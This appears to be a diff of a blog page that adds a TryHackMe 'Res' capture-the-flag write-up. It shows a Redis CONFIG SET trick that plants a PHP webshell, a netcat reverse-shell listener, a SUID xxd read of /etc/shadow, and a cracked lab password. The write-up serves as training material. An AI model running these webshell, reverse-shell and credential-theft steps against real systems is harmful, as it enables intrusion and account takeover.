@@ -16,90 +16,149 @@
 </head>
 <body>
     <div class="container">
-        <h1 class="text-center">Mate0r Write up</h1>
-        <div class="input-group mb-3">
-            <input type="text" class="form-control" placeholder="Search articles...">
-            <button class="btn btn-outline-secondary" type="button">Search</button>
-        </div>
-        <div class="row row-cols-1 row-cols-md-4 g-4">
-            <!-- Sample articles -->
-            <div class="col">
-                <div class="card">
-                    <img src="https://via.placeholder.com/300" class="card-img-top" alt="Sample Image">
-                    <div class="card-body">
-                        <h5 class="card-title">Expose</h5>
-                        <p class="card-text">#CTF #TryHackMe</p>
-                        <a href="#" class="btn btn-primary">Lire</a>
-                    </div>
-                </div>
-            </div>
-            <div class="col">
-                <div class="card">
-                    <img src="https://via.placeholder.com/300" class="card-img-top" alt="Sample Image">
-                    <div class="card-body">
-                        <h5 class="card-title">Article Title 2</h5>
-                        <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
-                        <a href="#" class="btn btn-primary">Read More</a>
-                    </div>
-                </div>
-            </div>
-            <div class="col">
-                <div class="card">
-                    <img src="https://via.placeholder.com/300" class="card-img-top" alt="Sample Image">
-                    <div class="card-body">
-                        <h5 class="card-title">Article Title 3</h5>
-                        <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
-                        <a href="#" class="btn btn-primary">Read More</a>
-                    </div>
-                </div>
-            </div>
-            <div class="col">
-                <div class="card">
-                    <img src="https://via.placeholder.com/300" class="card-img-top" alt="Sample Image">
-                    <div class="card-body">
-                        <h5 class="card-title">Article Title 4</h5>
-                        <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
-                        <a href="#" class="btn btn-primary">Read More</a>
-                    </div>
-                </div>
-            </div>
-            <!-- Add more articles here -->
+        <h1 id="writeupres">WriteUp - Res</h1>
+<p>https://tryhackme.com/r/room/toolsrus</p>
+<ul>
+<li>Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!</li>
+<li>Author : stuxnet</li>
+<li>Report by : Mate0r</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p>By doing nmap, we found a lot of ports</p>
+<pre class=" language-bash" tabindex="0"><code class="bash  language-bash">PORT     STATE SERVICE VERSION
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.18 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
+<span class="token number">6379</span>/tcp <span class="token function">open</span>  redis   Redis key-value store <span class="token number">6.0</span>.7
+</code></pre>
+<p>We have a redis and http server.
+By searching on google for redis pentest cheat sheet, i found this very interesting github note:
+https://github.com/Jean-Francois-C/Database-Security-Audit/blob/master/Redis%20database%20penetration%20testing
+https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell</p>
+<p>We found an interesting sentence about gaining a RCE if we can access a redis server and a website is running</p>
+<h1 id="method2gainremoteoscommandonthelinuxserverhostingtheredisdatabasebyaddingawebshell">Method 2. Gain remote OS command on the Linux server hosting the Redis database by adding a Webshell</h1>
+<p>• If a web server is hosted on the same Linux server than the Redis database, then we can try to add a Webshell using the commands CONFIG and SET in the web server folder (e.g. "/var/www/html/upload/" or "/usr/share/nginx/html/").</p>
+<h2 id="manualexploitation">Manual exploitation</h2>
+<p>=&gt; Example of commands to add a PHP Webshell on a web server hosted on the same Linux server than the REDIS database </p>
+<p>root@Security-Audit-01:~/Desktop/# redis-cli -h 192.168.1.104</p>
+<p>192.168.1.104:6379&gt; config set dir /var/www/html/uploads/
+OK
+192.168.1.104:6379&gt; config set dbfilename webshell.php
+OK
+192.168.1.104:6379&gt; set test "<!--?php system($_GET[cmd]); ?-->"
+OK
+192.168.1.104:6379&gt; save
+OK</p>
+<p>=&gt; curl http://192.168.1.104/uploads/webshell.php?cmd=ipconfig</p>
+<pre class=" language-bash" tabindex="0"><code class="bash  language-bash">┌──<span class="token punctuation">(</span>parallels㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hacking/thm/res<span class="token punctuation">]</span>
+└─$ redis-cli -h <span class="token number">10.10</span>.2.66
+<span class="token number">10.10</span>.2.66:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/uploads/
+<span class="token punctuation">(</span>error<span class="token punctuation">)</span> ERR Changing directory: No such <span class="token function">file</span> or directory
+<span class="token number">10.10</span>.2.66:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/
+OK
+<span class="token number">10.10</span>.2.66:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> config <span class="token builtin class-name">set</span> dbfilename webshell.php
+OK
+<span class="token number">10.10</span>.2.66:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> <span class="token builtin class-name">set</span> <span class="token builtin class-name">test</span> <span class="token string">"&lt;?php system(<span class="token variable">$_GET</span>[cmd]); ?&gt;"</span>
+OK
+<span class="token number">10.10</span>.2.66:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> save
+OK
+<span class="token number">10.10</span>.2.66:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span>
+</code></pre>
+<p><img src="image.png" alt="alt text"></p>
+<pre class=" language-bash" tabindex="0"><code class="bash  language-bash">┌──<span class="token punctuation">(</span>parallels㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hacking/thm/res<span class="token punctuation">]</span>
+└─$ <span class="token function">nc</span> -lvp <span class="token number">6666</span> 
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">6666</span> <span class="token punctuation">..</span>.
+<span class="token number">10.10</span>.2.66: inverse <span class="token function">host</span> lookup failed: Unknown <span class="token function">host</span>
+connect to <span class="token punctuation">[</span><span class="token number">10.8</span>.72.209<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.2.66<span class="token punctuation">]</span> <span class="token number">39038</span>
+/bin/sh: <span class="token number">0</span>: can<span class="token string">'t access tty; job control turned off
+$ python3 -c '</span><span class="token function">import</span> pty<span class="token punctuation">;</span>pty.spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>'
+www-data@ubuntu:/var/www/html$ ^Z
+zsh: suspended  <span class="token function">nc</span> -lvp <span class="token number">6666</span>
 
+┌──<span class="token punctuation">(</span>parallels㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hacking/thm/res<span class="token punctuation">]</span>
+└─$ stty raw -echo<span class="token punctuation">;</span><span class="token function">fg</span>   
+<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  + continued  <span class="token function">nc</span> -lvp <span class="token number">6666</span>
 
-            <nav id="navbar-example3" class="navbar navbar-light bg-light flex-column align-items-stretch p-3">
-                <a class="navbar-brand" href="#">Navbar</a>
-                <nav class="nav nav-pills flex-column">
-                  <a class="nav-link" href="#item-1">Item 1</a>
-                  <nav class="nav nav-pills flex-column">
-                    <a class="nav-link ms-3 my-1" href="#item-1-1">Item 1-1</a>
-                    <a class="nav-link ms-3 my-1" href="#item-1-2">Item 1-2</a>
-                  </nav>
-                  <a class="nav-link" href="#item-2">Item 2</a>
-                  <a class="nav-link" href="#item-3">Item 3</a>
-                  <nav class="nav nav-pills flex-column">
-                    <a class="nav-link ms-3 my-1" href="#item-3-1">Item 3-1</a>
-                    <a class="nav-link ms-3 my-1" href="#item-3-2">Item 3-2</a>
-                  </nav>
-                </nav>
-              </nav>
-              
-              <div data-bs-spy="scroll" data-bs-target="#navbar-example3" data-bs-offset="0" tabindex="0">
-                <h4 id="item-1">Item 1</h4>
-                <p>...</p>
-                <h5 id="item-1-1">Item 1-1</h5>
-                <p>...</p>
-                <h5 id="item-1-2">Item 1-2</h5>
-                <p>...</p>
-                <h4 id="item-2">Item 2</h4>
-                <p>...</p>
-                <h4 id="item-3">Item 3</h4>
-                <p>...</p>
-                <h5 id="item-3-1">Item 3-1</h5>
-                <p>...</p>
-                <h5 id="item-3-2">Item 3-2</h5>
-                <p>...</p>
-              </div>
-        </div>
+www-data@ubuntu:/var/www/html$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>
+www-data@ubuntu:/var/www/html$
+</code></pre>
+<pre class=" language-bash" tabindex="0"><code class="bash  language-bash">www-data@ubuntu:/var/www/html$ <span class="token function">find</span> / -user root -perm -u<span class="token operator">=</span>s <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null      
+/bin/ping
+/bin/fusermount
+/bin/mount
+/bin/su
+/bin/ping6
+/bin/umount
+/usr/bin/chfn
+/usr/bin/xxd
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+</code></pre>
+<pre class=" language-bash" tabindex="0"><code class="bash  language-bash">www-data@ubuntu:/var/www/html$ xxd /etc/shadow <span class="token operator">|</span> xxd -r <span class="token operator">|</span> <span class="token function">more</span>
+root:<span class="token operator">!</span>:18507:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18506:0:99999:7:::
+uuidd:*:18506:0:99999:7:::
+vianka:<span class="token variable">$6</span><span class="token variable">$2p</span>.tSTds<span class="token variable">$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR</span>.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
+</code></pre>
+<pre class=" language-bash" tabindex="0"><code class="bash  language-bash">vianka:<span class="token variable">$6</span><span class="token variable">$2p</span>.tSTds<span class="token variable">$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR</span>.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0
+</code></pre>
+<pre class=" language-bash" tabindex="0"><code class="bash  language-bash">┌──<span class="token punctuation">(</span>parallels㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hacking/thm/res<span class="token punctuation">]</span>
+└─$ john --wordlist<span class="token operator">=</span>/usr/share/wordlists/rockyou.txt vianka.hash 
+Using default input encoding: UTF-8
+Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>sha512crypt, crypt<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token variable">$6</span>$ <span class="token punctuation">[</span>SHA512 <span class="token number">128</span>/128 ASIMD 2x<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Cost <span class="token number">1</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">5000</span> <span class="token keyword">for</span> all loaded hashes
+Will run <span class="token number">2</span> OpenMP threads
+Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
+beautiful1       <span class="token punctuation">(</span>vianka<span class="token punctuation">)</span>     
+1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-04-15 <span class="token number">13</span>:26<span class="token punctuation">)</span> <span class="token number">1</span>.515g/s 1939p/s 1939c/s 1939C/s kucing<span class="token punctuation">..</span>poohbear1
+Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<pre class=" language-bash" tabindex="0"><code class="bash  language-bash">vianka@ubuntu:~$ <span class="token function">sudo</span> -l
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> vianka: 
+Sorry, try again.
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> vianka: 
+Matching Defaults entries <span class="token keyword">for</span> vianka on ubuntu:
+    env_reset, mail_badpass,
+    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin
+
+User vianka may run the following commands on ubuntu:
+    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL
+vianka@ubuntu:~$ <span class="token function">sudo</span> <span class="token function">su</span>
+root@ubuntu:/home/vianka<span class="token comment">#</span>
+</code></pre>
+<pre class=" language-bash" tabindex="0"><code class="bash  language-bash"><span class="token comment"># We could have directly read the root.txt file</span>
+www-data@ubuntu:/var/www/html$ xxd /root/root.txt <span class="token operator">|</span> xxd -r <span class="token operator">|</span> <span class="token function">more</span>
+</code></pre>
     </div>
 
     <!-- Bootstrap Bundle with Popper and Bootstrap JS -->
